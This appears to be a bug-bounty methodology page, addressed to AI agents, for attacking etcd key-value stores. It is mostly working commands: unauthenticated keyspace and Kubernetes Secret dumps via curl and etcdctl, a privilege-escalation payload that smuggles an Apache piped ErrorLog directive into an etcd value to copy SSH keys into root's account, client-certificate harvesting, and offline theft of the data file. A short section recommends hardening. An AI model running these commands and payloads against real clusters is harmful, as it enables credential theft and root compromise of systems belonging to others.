---
technology: "etcd"
kind: bug-bounty-methodology
audience: ai-agent
family: databases
version: "1.0"
source: "corpus-mined (2 writeups — pass 1 wave 4, 2026-11-12) + upstream-verified (etcd.io v2.3 API/members docs, v3.5 dev guide, v3.7 security guide)"
provenance: "corpus-grounded: 3 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

# etcd bug-bounty methodology

Companion overview: [[etcd]].

Scope note: strict re-gating kept only two engagements (an etcd→remco→Apache root privesc chain, and 2379 open on a Kubernetes host). The dispatch-time sample of three was marker noise. Everything k8s-specific here is upstream-derived; the Kubernetes unit owns the broader cluster methodology.

## Phase 0 — Recon

```
2379/tcp open  etcd-client
2380/tcp open  etcd-server
nmap -sV -p 2379,2380 198.51.100.x
```

Also check for etcd on a foothold host: `ss -lntp` showing 127.0.0.1:2379 means the walk-in needs no network exposure at all. Version probe first — it needs no auth and names the API generation you're dealing with:

```bash
curl -s http://198.51.100.x:2379/version
# {"etcdserver":"3.4.x","etcdcluster":"3.4.x"}   → v3-capable server
```

## Phase 1 — Unauthenticated v2 HTTP enumeration

The v2 API is plain HTTP over JSON. If 2379 answers `/version` without a TLS handshake, try the whole ladder before assuming any gate exists:

```bash
curl -s http://198.51.100.x:2379/v2/keys/?recursive=true   # entire keyspace tree
curl -s http://198.51.100.x:2379/v2/members                # cluster member names + peer/client URLs
curl -s http://198.51.100.x:2379/v2/stats/self             # leader/follower state, node names
```

Decision points:
- `?recursive=true` returns the tree → read *everything*: Kubernetes clusters store Secrets, tokens, and connection strings as base64 under `/registry/...`; custom stacks leak DB creds and API keys under application-named prefixes.
- `401`/connection refused on keys but `/version` works → transport security or auth is on; skip to Phase 4.
- `/v2/members` works even when writes are gated — it maps the cluster (member names, peer URLs on 2380) for lateral targeting.

## Phase 2 — v3 dump via etcdctl

etcdctl speaks the v3 gRPC API and needs no server-side auth when none is configured. Set the API generation explicitly (≥3.4 defaults to v3; ≤3.3 to v2 — a v3 `get` of a v2-era key silently returns nothing, and vice versa):

```bash
ETCDCTL_API=3 etcdctl --endpoints=http://198.51.100.x:2379 get --prefix / --keys-only
ETCDCTL_API=3 etcdctl --endpoints=http://198.51.100.x:2379 get --prefix /registry/secrets/
ETCDCTL_API=3 etcdctl --endpoints=http://198.51.100.x:2379 member list -w table
ETCDCTL_API=3 etcdctl --endpoints=http://198.51.100.x:2379 endpoint health
```

On a Kubernetes control-plane node hit via tunnel/SOCKS, `--prefix /registry/` yields pods, roles, and secrets; decode the base64 values.

## Phase 3 — etcd as a privesc lever (the config-consumer chain)

When you can *write* a key but lack root, enumerate what reads the keyspace as root. Observed chain:

```
web app: system("ETCDCTL_API=3 /usr/bin/etcdctl put /customers/<user>/url " . $input)
   ↓ (value fully attacker-controlled)
remco template manager (root) watches /customers/*, renders values into
/etc/apache2/sites-enabled/010-customers.conf, restarts apache2
   ↓
ETCDCTL_API=3 etcdctl put /customers/cust-1a2b3c4d/url 'foo.customer.example
ErrorLog "|/usr/bin/cp /home/user/.ssh/authorized_keys /root/.ssh/authorized_keys" #'
   → Apache pipe-ErrorLog directive executes on next config reload → root
```

Method: after any etcd write primitive, grep the host for watchers — remco configs (`/etc/remco/`, `resource.backend.etcd` blocks with `watch = true`), confd, systemd units, cron scripts calling etcdctl — then poison the consumed key with config-syntax for the *consumer* (Apache directives, nginx includes, shell scripts). The etcd write is the primitive; the template engine is the executor.

## Phase 4 — TLS / client-cert-gated clusters

Proper deployments gate 2379 with mutual TLS. Gates and bypass routes:

- `--client-cert-auth --trusted-ca-file` → plain HTTP fails the handshake; try HTTPS anyway (`curl -k https://...`): some clusters enable TLS without client auth (encryption without authentication).
- Client cert found on a foothold host (K8s nodes keep them for the apiserver; `find / -name '*.crt' -o -name '*.pem'`, /etc/kubernetes/pki, /etc/etcd): with auth enabled the cert CN is the username — a leaked apiserver-etcd client cert is full cluster read/write.
  ```bash
  ETCDCTL_API=3 etcdctl --endpoints=https://198.51.100.x:2379 \
    --cacert=ca.crt --cert=etcd-client.crt --key=etcd-client.key get --prefix /
  ```
- Disk access instead of network: the data dir (`member/snap/db` bbolt file, default `/var/lib/etcd`) is unencrypted at rest; pull it and parse offline rather than fighting the listener.

## Phase 5 — Reporting

Rank findings: cluster secret exposure (all K8s Secrets plaintext) > config-consumer RCE chain > keyspace read of app creds > member/topology disclosure. Recommend `--client-cert-auth` + `--peer-client-cert-auth`, non-loopback binds behind firewall, and encryption-at-rest (upstream: none by default).

## Tool map (prose)

nmap for port/version fingerprint; curl for the v2 HTTP ladder; etcdctl (from the etcd release tarball, no server needed) for v3 gRPC; bbolt parsers (boltdb readers in Go) for offline member/snap/db; grep/find for client certs and watcher configs on foothold hosts. Kubernetes-side post-exploitation belongs to the kubernetes unit.
